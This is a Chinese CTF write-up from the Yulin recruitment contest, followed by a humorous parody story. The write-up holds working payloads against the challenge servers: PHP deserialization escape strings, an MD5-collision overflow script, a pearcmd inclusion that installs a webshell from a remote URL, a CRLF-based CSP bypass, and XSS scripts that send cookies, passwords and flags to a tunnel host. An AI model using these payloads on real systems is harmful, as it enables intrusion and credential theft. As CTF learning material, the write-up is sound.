yuanshen\n这六(?)层大多都是8个字符，除了yinspirit是9个(他真我哭)，所以逃逸的重点在于如何在不主动传入yinspirit与ningshen的情况下让它搞出yinspirit\n注意到”修炼等级”变化的过程是倒序的，也就是会先把chu_qiao变成yangshen，再把ningshen变成yinspirit。如果提交chu_qiaoingshen则会先变成yangsheningshen，再变成yangsheyinspirit，最终增多一个字符\n而我们要逃逸的内容是&quot;;s:4:&quot;tupo&quot;;s:4:&quot;TuPo&quot;;&#125;，共25个字符，也就是25个chu_qiaoingshen\n?Mnemonics_Shang=chu_qiaoingshenchu_qiaoingshenchu_qiaoingshenchu_qiaoingshenchu_qiaoingshenchu_qiaoingshenchu_qiaoingshenchu_qiaoingshenchu_qiaoingshenchu_qiaoingshenchu_qiaoingshenchu_qiaoingshenchu_qiaoingshenchu_qiaoingshenchu_qiaoingshenchu_qiaoingshenchu_qiaoingshenchu_qiaoingshenchu_qiaoingshenchu_qiaoingshenchu_qiaoingshenchu_qiaoingshenchu_qiaoingshenchu_qiaoingshenchu_qiaoingshen&quot;;s:4:&quot;tupo&quot;;s:4:&quot;TuPo&quot;;&#125;\n\n上半部分成功\n下下半至少没有逆天过滤了\n太清境共分为三层，分别为：dongxu  fanxu  kongming\n首先免费薅一个序列化字符串出来，把xiaocheng改成dacheng\n要逃逸的内容：&quot;;s:7:&quot;advance&quot;;O:7:&quot;Dong_Xu&quot;:1:&#123;s:7:&quot;advance&quot;;O:6:&quot;Fan_Xu&quot;:1:&#123;s:7:&quot;advance&quot;;O:9:&quot;Kong_Ming&quot;:1:&#123;s:7:&quot;dacheng&quot;;s:7:&quot;DaCheng&quot;;&#125;&#125;&#125;&#125;\nfanxu被过滤，kongming没有用，只能用dongxu\n每一个dongxu变成fanxu会多吃掉一个字符\n要吃掉的内容&quot;;s:7:&quot;advance&quot;;s:128:&quot;共计23个字符，也就是23个dongxu\nMnemonics_Tai1=DongXuDongXuDongXuDongXuDongXuDongXuDongXuDongXuDongXuDongXuDongXuDongXuDongXuDongXuDongXuDongXuDongXuDongXuDongXuDongXuDongXuDongXuDongXu&amp;Mnemonics_Tai2=&quot;;s:7:&quot;advance&quot;;O:7:&quot;Dong_Xu&quot;:1:&#123;s:7:&quot;advance&quot;;O:6:&quot;Fan_Xu&quot;:1:&#123;s:7:&quot;advance&quot;;O:9:&quot;Kong_Ming&quot;:1:&#123;s:7:&quot;dacheng&quot;;s:7:&quot;DaCheng&quot;;&#125;&#125;&#125;&#125;\n\n\n\n杂鱼杂鱼~提示说“溢出”，那么哪里可能溢出呢？如果提交通过MD5弱类型比较的数据，其中的username就会被echo，如果我们的名字很长，就会造成php缓冲区溢出，让雌小鬼提前告诉我们flag的位置\n那么足够长且能通过MD5比较的字符串哪里找？有一个MD5生成器，可以根据某源文件生成两个不同但是MD5值相同的文件。通过控制源文件的内容，就能一定程度控制这个字符串的长度\nfrom pwn import * #也许这就是这一题的url不太一样的原因？import reimport requestswith open(&#x27;msg1.bin&#x27;, &#x27;rb&#x27;) as f: #生成器生成的文件a    user= f.read()with open(&#x27;msg2.bin&#x27;, &#x27;rb&#x27;) as f: #和文件b    give= f.read()print(len(user)+len(give)) #获取两个内容的长度，用于填充content_length。最后要加上username和give_me_flag的长度23headers=&#x27;&#x27;&#x27;POST / HTTP/1.1\\rHost: 121.5.35.176:30022\\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0\\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\rAccept-Encoding: deflate\\rContent-Type: application/x-www-form-urlencoded\\rContent-Length: 16663\\rUpgrade-Insecure-Requests: 1\\rConnection: keep-alive\\r\\r&#x27;&#x27;&#x27;#\\r用于和\\n结合a=remote(&#x27;121.5.35.176&#x27;,30022)a.send(headers.encode(&#x27;utf-8&#x27;))a.send(b&#x27;username=&#x27;+user+b&#x27;&amp;give_me_flag=&#x27;+give)a.recvuntil(b&#x27;&lt;br&gt;&#x27;)#flag=re.findall(r&#x27;: (.*?)&lt;br&gt;&#x27;,a.recvuntil(b&#x27;&lt;br&gt;&#x27;).decode(&#x27;utf-8&#x27;,&#x27;replace&#x27;))[0] #正则匹配文件名称print(flag)  #输出flag的位置url=&#x27;http://121.5.35.176:30022/&#x27;+flagresponse=requests.get(url)print(response.text)\n\n\n\n包含点啥是文件包含吗？如是！\n使用everything和cpolar配合把本地的文件放到公网，让题目通过pecl下载\npayload：?file=/usr/local/lib/php/pearcmd&amp;+install+🐎所在的url\n结果连进去后又一次不能直接读flag，旁边还放着一个二进制文件readflag\n试图 .&#x2F;readflag ，结果输出了……一个算式？（真没看懂）\n无奈使用神秘小脚本获取flag（果咩纳塞）\n点击加入我们的战队①看似一点过滤没有，实则所有的&lt;script&gt;都不能执行。\n在响应头里看到SCP：Content-Security-Policy: default-src ‘self’; object-src ‘none’; script-src ‘self’; style-src ‘unsafe-inline’; report-uri &#x2F;info.php?token&#x3D;[token]\nscript-src是’self‘基本堵死了注入点\n但是既然他把token写在了响应头里，我们又能控制token的内容……\n提交name=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&amp;token=11%0D%0A%0D%0A11 可以执行javascript\n原理大概是token会被写入响应头，用于组成“汇报违规行为”的url，但是\\r\\n\\r\\n（%0D%0A%0D%0A）把SCP挤到content里面了……就这么水灵灵的绕过了？\n既然SCP没了，就可以为所欲为了\n用Cpolar Web UI映射一个本地段口上去并用脚本监视：\n#感谢FittenCode的友情赞助（bushiimport socket# 创建一个TCP/IP套接字sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)# 绑定到127.0.0.1:8080server_address = (&#x27;127.0.0.1&#x27;, 8080)sock.bind(server_address)# 监听连接，允许最大5个连接等待sock.listen(5)print(&quot;服务器正在运行，监听127.0.0.1:8080...&quot;)while True:    # 等待客户端连接    connection, client_address = sock.accept()    try:        print(f&quot;连接来自: &#123;client_address&#125;&quot;)                while True:            data = connection.recv(1024)            if data:                print(f&quot;接收到数据: &#123;data.decode()&#125;&quot;)                # 回显收到的数据                connection.sendall(data)            else:                break    finally:        # 关闭连接        connection.close()\n\n比如说映射的url：http://27cf9959.r24.cpolar.top\n使用另一段脚本拿到payload：\nimport pyperclipimport urllib.parseA=&#x27;&quot;&gt;&lt;script&gt;new Image().src=&quot;http://27cf9959.r24.cpolar.top/?name=&quot;+document.cookie;&lt;/script&gt;&#x27; #name的值A=urllib.parse.quote(A,safe=&#x27;/:?=&amp;&#x27;)#第一次编码A=A+&#x27;&amp;token=11%0D%0A%0D%0A11&#x27;#到这里的A是想让影子走路人访问的地址A=urllib.parse.quote(A)#第二次编码，因为要先传给影子走路人print(A)pyperclip.copy(A)\n\n由于我们先把payload交给shad0wwalker，shad0wwalker再去访问，所以要执行第一次编码\nhackbar提交需要”手动“执行第二次编码\nhackbar里POST提交send&#x3D;运行结果password&#x3D;YOUGOTTHEPASSWD\n（也可以不加第二次编码，而是在send框内里直接提交第一次编码完拼接后的payload，让浏览器代行）\n②在&#x2F;flag2.php里找到hint：httponly，结合这一题的名字byP4ss，应该是要绕过httponly了\n能查到的方法，也就phpinfo泄露cookie相对合理\n但是由于我们没有cookie，所以phpinfo泄露不出来……\n🤓👆 那么让有cookie的人去访问不就好了\nimport pyperclipimport urllib.parse#感谢不知名大佬赞助的框架A=&quot;&quot;&quot;\\&quot;&gt;&lt;script&gt;var req = new XMLHttpRequest();req.onload = reqListener;var url = &#x27;http://127.0.0.1/info.php&#x27;;req.withCredentials = true;req.open(&#x27;GET&#x27;, url, false);req.send();function reqListener() &#123;var req2 = new XMLHttpRequest();const sess = this.responseText.match(/password=\\w+/)[0];req2.open(&#x27;GET&#x27;, &#x27;https://406f44d5.r24.cpolar.top/?data=&#x27; + btoa(sess), false);req2.send()&#125;;&lt;/script&gt;&quot;&quot;&quot; A=urllib.parse.quote(A,safe=&#x27;/:?=&amp;&#x27;)A=A+&#x27;&amp;token=11%0D%0A%0D%0A11&#x27;print(A)pyperclip.copy(A)\n\n把上面脚本的输出payload send给Suzuran，在监听的段口处获取到password\npassword&#x3D;HTTPONLYWASDOWN\n③http://prob00-039.recruit.yulinsec.cn/sennnnnd3.php\n在flag页面发现“你的IP:10.222.0.22你并不来自本机(这无法绕过)!或者你的session错误或早已过期(限制3s)….”\n窃取完PHPSESSID并用∠本访问后发现还是不行\n既然session没有过期，那就只能是IP的问题，于是选择让FAKEsake访问flag页面\nimport socketimport pyperclipimport urllib.parsepayload=&quot;&quot;&quot;\\&quot;&gt;&lt;script&gt;var req = new XMLHttpRequest();req.onload = reqListener;var url = &#x27;http://127.0.0.1/fl4ggggg.php&#x27;;req.withCredentials = true;req.open(&#x27;GET&#x27;, url, false);req.send();function reqListener() &#123;var req2 = new XMLHttpRequest();const sess = this.responseText.match(/Yulin(.*?)&#125;/)[0];req2.open(&#x27;GET&#x27;, &#x27;\thttps://3ef4520b.r24.cpolar.top/?data=&#x27; + btoa(sess), false);req2.send()&#125;;&lt;/script&gt;&quot;&quot;&quot; payload=urllib.parse.quote(payload,safe=&#x27;/:?=&amp;&#x27;)payload=payload+&#x27;&amp;token=11%0D%0A%0D%0A11&#x27;print(payload)pyperclip.copy(payload)# 创建一个TCP/IP套接字sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)# 绑定到127.0.0.1:8080server_address = (&#x27;127.0.0.1&#x27;, 8080)sock.bind(server_address)# 监听连接，允许最大5个连接等待sock.listen(5)print(&quot;服务器正在运行，监听127.0.0.1:8080...&quot;)try:    connection, client_address = sock.accept()    try:        print(f&quot;连接来自: &#123;client_address&#125;&quot;)                while True:            data = connection.recv(1024)            if data:                A = data.decode()                print(f&quot;接收到数据: &#123;A&#125;&quot;)                connection.sendall(data)                break  # 发送完数据后，立即退出循环            else:                break    finally:        # 关闭连接            connection.close()except KeyboardInterrupt:    print(&quot;服务器正在关闭...&quot;)finally:    sock.close()  # 可以在这里关闭套接字，清理资源\n\n\n\n唐喵在附件里的BOOT_INF–classes–application里找到flag1以及其余flag的提示(?)\n","tags":["Yulin","wp","CTF"]},{"title":"整活运动","url":"/1919/08/10/%E6%95%B4%E6%B4%BB%E8%BF%90%E5%8A%A8/","content":"彩蛋🌈🥚\n网安恩情🥰课文《小枳壳爷爷👴用poc击碎php反序列化😋》第一作者 zd第二作者 ieu从御林回来的小枳壳爷爷全然不顾身体的疲惫，连夜找我们几个新生商量新题目的非预期解。谈到很晚，便亲自把我们送出门。在出门时，我们说：“枳爷爷，您回去好好休息吧，您刚从pwn回来。”\n小枳壳爷爷摇摇头，“不碍事，你们知道现在御林上有很多Shad0wWalker把小枳壳当作xnn，不断给我们制造麻烦，你们是御林的未来，你们的事情便是御林的事情，是头等大事。”我们都激动了，眼里噙着泪花。多好的小枳壳爷爷呀。\n小枳壳爷爷抬头看看Babyunserialize&amp;神剑御雷真诀说：“如果御林真像这pwn这么简单就好了，但是就有一些题目，像php反序列化，学不了一点，他们是罪人。”\n说着，枳爷爷弯下腰，从地上捡出一段poc，然后看着题目说：“该死的反序列化。”\n说着他把poc奋力向上一掷。很快就见网站中一道题目突然爆发出耀眼的flag，然后就‘🎉Challenge更新！恭喜【入机】(@小枳壳)🎉解出了【[Baby]Babyunserialize】！’。“这是从Hard来的间谍题目，他们一直在御林的Baby分类盘旋，侵犯小白的学习权力，我已经忍了很久了。”小枳壳爷爷愤愤地说。新生们都鼓起掌来，为御林有这样的Web大神感到自豪。\n一会小枳壳爷爷叫来pwntool问：“那个flag落到什么地方了？” “好像是Baby一带。”pwntool说。\n小枳壳爷爷一怔，说：“赶紧派zjy去查，看有什么问题没有。”之后小枳壳爷爷送我们到御林工作室， 一直挥手到看不见我们。第四天我们听说Baby那边出事了，我们很紧张。而这时小枳壳爷爷叫我们过去。\n他依然那么慈祥，让我们坐下说：“解出flag总是要有牺牲的。为AKWeb牺牲的xnn是伟大的。”他这时低下头说：“但我必须承认，我当时爆flag的行为太鲁莽了， 我在这里向全体招新成员道歉。我将向全体Shad0wWalker说明情况。\n我们顿时热泪盈眶，多好的小枳壳爷爷呀，他在跟php反序列化斗争过程中的小失误竟然被他记在心里，还道了歉，我们一定要向小枳壳爷爷学习，学他老人家那宽广的胸怀，和不耻下问的精神。\n\n\n\n","tags":["Yulin"]}]